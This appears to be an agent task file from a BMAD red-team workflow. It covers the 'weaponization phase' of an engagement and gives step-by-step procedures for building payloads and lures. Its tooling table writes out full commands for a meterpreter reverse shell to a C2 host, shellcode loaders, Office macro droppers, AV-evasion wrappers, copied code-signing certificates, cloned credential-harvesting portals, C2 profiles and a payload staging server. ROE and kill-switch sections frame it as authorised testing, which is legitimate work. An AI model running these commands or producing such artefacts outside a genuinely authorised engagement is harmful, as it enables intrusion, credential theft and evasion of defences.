<!-- Powered by BMAD(R) Core -->

# Task: weaponization-phase

## Purpose
- Transform recon findings into live payload and lure deliverables that respect ROE and MITRE ATT&CK.
- Produce docs/red-team/payload-report.md outlining payload artefacts, observables, mitigations, and delivery prerequisites.

## Prerequisites
- docs/red-team/recon-report.md
- Approved payload families, lure channels, staging infrastructure, and ROE constraints.
- Workspace directories: build/payloads, build/lures, build/profiles, reports/weaponization.

## Success Criteria
- Each payload/lure traces back to recon exposures and mission objectives.
- Generated artefacts include hashes, storage paths, observables, detections, mitigations, and kill-switch guidance.
- Documentation aligns with TA0042 (Resource Development) and TA0001 (Initial Access) techniques, with clear defensive recommendations.
- Handoff equips Delivery phase with staging requirements, telemetry hooks, and outstanding approvals.

## Safety & Compliance
- Execute only payload families and channels authorised by ROE; escalate requests beyond scope.
- Hash and catalogue every artefact in build/ directories; store logs with timestamps in reports/weaponization/.
- Tokenise or redact sensitive data before sharing; keep originals in controlled storage.
- Define kill-switch/cleanup procedures for each payload and lure before handoff.

## Recommended Tooling
| Tool | Command | Goal | Expected Output |
| --- | --- | --- | --- |
| msfvenom | `msfvenom -p windows/x64/meterpreter_reverse_https LHOST={{c2_host}} LPORT={{c2_port}} -f exe -o build/payloads/meterpreter-{{timestamp}}.exe` | Generate reverse-shell payload binaries. | Executable saved with console summary; hash and size noted. |
| donut | `donut -f build/payloads/custom.bin -o build/payloads/custom-loader-{{timestamp}}.js` | Convert shellcode to .NET/JS loader for macro/HTA use. | Loader script with entry point metadata. |
| macro_pack | `macro_pack.exe -t DROPPER -f docs/templates/decoy.docm -o build/lures/macro-dropper-{{timestamp}}.docm` | Embed macro droppers inside Office documents. | Lure document and log describing injected VBA. |
| veil | `python3 /opt/veil/Veil.py --generate --payload python/shellcode_inject --output-name veil-{{timestamp}}` | Produce obfuscated payloads and capture AV evasion context. | Build log citing output path, encoders, signatures. |
| sigthief | `python3 SigThief.py -i build/payloads/meterpreter-{{timestamp}}.exe -s samples/signed.exe -o build/payloads/meterpreter-signed-{{timestamp}}.exe` | Copy code-signing certificates for OPSEC testing. | Signed payload plus certificate summary. |
| pezor | `python3 pezor.py -i build/payloads/custom.bin -o build/payloads/custom-pezor-{{timestamp}}.exe -c aes` | Wrap shellcode in encrypted PE loader. | Loader executable with encryption metadata. |
| setoolkit | `setoolkit --noprompt --template credharvest --url {{phish_url}} --port 443` | Clone credential portals for phishing lures. | Toolkit log detailing cloned site, captured fields, session storage. |
| cobaltstrike profile | `beaconizer profile generate --profile configs/https-client.yml --out build/profiles/https-client-{{timestamp}}.profile` | Create malleable C2 profile matching payload design. | Profile file with headers, jitter, watermark values. |
| python -m http.server | `(cd build/payloads && python3 -m http.server {{staging_port}})` | Host payload staging server quickly for delivery. | HTTP server listening log with requested files recorded. |

## Procedure
1. Review docs/red-team/recon-report.md and extract prioritized exposures, target technologies, and defensive telemetry references.
2. Confirm authorised payload families and lure channels with stakeholders. Document ROE constraints, required approvals, and safety requirements.
3. For each payload concept:
   - Identify prerequisites (access, credentials, staging hosts) and intended delivery vector.
   - Map to relevant ATT&CK techniques (e.g., T1566.001 Spearphishing Attachment, T1105 Ingress Tool Transfer).
   - Generate payload using approved tooling (msfvenom, donut, veil, pezor, etc.). Store outputs under build/payloads/ with timestamped filenames; capture hashes and console logs in reports/weaponization/.
4. For each lure concept:
   - Craft narrative and artefacts (macro documents, phishing portals, trojanised installers) with tooling such as macro_pack, setoolkit, custom HTML/email templates.
   - Record observables (subject lines, URLs, metadata) and defensive countermeasures (mail filters, awareness messaging).
5. Produce supporting configurations (C2 profiles, loader scripts, signing/cert artefacts) that align with payload requirements. Store them under build/profiles/ or build/lures/ as appropriate.
6. Document each payload/lure in a catalog including:
   - Description and purpose
   - Build commands/tooling and required infrastructure
   - Hashes, file paths, sizes
   - Execution flow, dependencies, and observables (network callbacks, registry keys)
   - Detection guidance (EDR, SIEM, mail gateway rules) and mitigation recommendations
   - Kill-switches and cleanup instructions
7. Populate docs/red-team/payload-report.md via the template, incorporating summary, recon inputs, payload concepts, lure design, detections/mitigations, ATT&CK mapping, and delivery handoff information.
8. Validate all artefacts comply with ROE (no unauthorised live C2, dangerous payload release). Archive supporting logs and update evidence register.
9. Prepare a concise handoff brief for the Delivery Agent summarising approved payloads, lure assets, staging checklists, monitoring hooks, and unresolved questions.

## Decision Gates
- **ROE Approval**: Stop if payload family or lure channel exceeds authorised actions; escalate for approval before proceeding.
- **Detection Risk**: Reassess if detection likelihood is too high without mission value; propose alternate payloads or mitigations.
- **Infrastructure Readiness**: Ensure staging hosts, C2 profiles, and credential stores exist before finalising handoff.
- **Safety Review**: Confirm kill-switch and cleanup instructions are defined; do not release artefacts without them.

## Outputs
- `docs/red-team/payload-report.md`
- Artefacts in `build/payloads`, `build/lures`, `build/profiles`, with logs/hashes in `reports/weaponization`
- Handoff summary for Delivery phase with staging and monitoring requirements.
